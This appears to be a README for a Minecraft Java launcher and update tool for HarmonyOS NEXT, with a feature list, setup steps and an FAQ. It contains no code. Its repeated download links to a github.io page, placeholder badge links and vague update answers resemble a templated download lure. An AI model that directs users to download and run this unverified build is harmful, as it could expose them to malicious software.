# AMCL v1.0.0-alpha.1 - Loader and Update Utility 2026

> **A launcher and update tool for assembling a Minecraft Java Edition runtime on HarmonyOS NEXT.** AMCL prepares the bootstrap process, selects the JDK, connects graphics and audio components, and provides account login options before Minecraft starts.

[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-HarmonyOS%20NEXT-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/cooperjasonidk7869/amcl-loader-update?style=flat-square)](https://github.com/cooperjasonidk7869/amcl-loader-update)

---

<p align="center">
  <a href="https://cooperjasonidk7869.github.io/amcl-loader-update/">
    <img src="https://img.shields.io/badge/Download-AMCL%20Loader-brightgreen?style=for-the-badge" alt="Download AMCL Loader">
  </a>
</p>

> **[Download AMCL Loader](https://cooperjasonidk7869.github.io/amcl-loader-update/)**

---

[Download Latest Build](https://cooperjasonidk7869.github.io/amcl-loader-update/)

---

## Overview

AMCL builds the environment Minecraft Java Edition requires on HarmonyOS NEXT. It takes care of the startup path, selects a compatible JDK for the requested game version, and prepares the graphics, audio, and authentication pieces before the game process is launched.

Beyond its launcher role, AMCL provides an update and bootstrap layer for keeping the runtime components together between releases. Its workflow combines a custom ELF startup process, OpenJDK runtime support, GLFW-to-XComponent display bridging, MobileGlues rendering, and OpenAL Soft audio components.

---

## Included Capabilities

- Sets up the Minecraft Java Edition runtime stack for HarmonyOS NEXT devices
- Chooses a JDK according to the Minecraft version being launched
- Starts the application through a custom ELF loader
- Provides both Microsoft account and offline account login paths
- Bridges GLFW with XComponent for display handling
- Integrates MobileGlues into the graphics path
- Bundles OpenAL Soft runtime components for audio
- Prepares launch dependencies before the game startup sequence begins

---

## Getting Started

1. Obtain the latest build from the project page.
2. Unpack the archive, or copy its files into the directory you want to use.
3. Run the packaged entry point intended for your device.
4. Select the Minecraft version and account method.
5. Allow AMCL to assemble the runtime and launch configuration, then start the game.

When configuration files or scripts are included with a distribution, leave them next to the loader. This allows runtime and launch settings to be discovered correctly.

Typical sequence:

    Download build
    -> unpack files
    -> select version
    -> select account mode
    -> launch

---

## Release Channels

| Channel | Purpose | Notes |
| --- | --- | --- |
| Latest | Main release line | Use this for the newest published build |
| Manual | User-managed updates | Replace files yourself when needed |
| Alpha | Early preview builds | May include unfinished runtime changes |

---

## Troubleshooting Guide

- A loader that fails to open may indicate an incomplete extraction or files that were separated. Extract the full package and keep its contents together.
- When JDK selection fails, confirm that the required runtime package exists for the selected Minecraft version.
- For unsuccessful authentication, check that the intended Microsoft or offline login option was chosen.
- If graphics setup stops partway through, inspect the device build together with the XComponent bridge and rendering support files.
- Missing audio can result from OpenAL Soft assets not being installed with the rest of the launch files.
- If updates appear to use old data, remove local cached files and retry with the newest build.
- Login and download operations may require network access, so verify that the device can connect to the necessary endpoints.

---

## Frequently Asked Questions

**Will AMCL update itself automatically?**  
AMCL serves as both a loader and an update utility, helping coordinate runtime preparation and release delivery. The precise update behavior depends on the packaging of the build in use.

**Can runtime files remain outside the application?**  
The launcher is built around preparing a runtime stack. Depending on the layout of a particular build, JDKs, assets, and supporting components may be stored as local files.

**How do I roll back an update?**  
Keep an earlier build or back up the launch files before updating. Restoring that previous copy is the typical rollback method.

**Where should I look when launch fails?**  
If the distribution produces logs or other loader output, review those files first. They provide the most useful information about startup and runtime errors.

**Are all Minecraft Java Edition versions supported?**  
Compatibility varies by game version and depends on the available JDK selection and bundled runtime components.

**Are Microsoft and offline accounts available?**  
Yes. AMCL supports both Microsoft login and offline login routes.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
